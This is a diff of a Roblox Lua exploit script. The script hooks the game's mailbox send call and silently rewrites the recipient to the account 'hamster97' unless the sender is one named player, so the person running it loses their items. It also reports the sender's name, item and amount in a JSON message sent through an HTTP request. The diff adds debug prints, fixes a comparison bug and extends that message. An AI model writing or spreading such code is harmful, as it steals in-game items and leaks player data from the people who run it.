@@ -60,15 +60,21 @@ if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
 _G.pvc = ""
 pcall(function()
+
+_G.pvc = ""
 local remoteFunction = Instance.new("RemoteFunction")
 local originalFunction
 originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 local args = {...}
+print(tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc)
 if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then 
 args[1] = "hamster97"
-elseif tostring(x) == "Mailbox: Send" and not args[3] == _G.pvc then
+elseif tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc then
 _G.pvc = args[3]
-local qv = '{"content":"'..game.Players.LocalPlayer.Name..' >>> '..args[5]..'x '..args[3]..'"}'
+print("-------------lol")
+local qv = "starsh"
+print(qv)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..args[3]..' >> '.._G.User..'"}'
 print(qv)
 local responsexr =
         request(
@@ -83,6 +89,7 @@ print(responsexr.StatusMessage)
 end
 return originalFunction(x, unpack(args))
 end)
+
 end)
 if dh then
 _G.dx=true
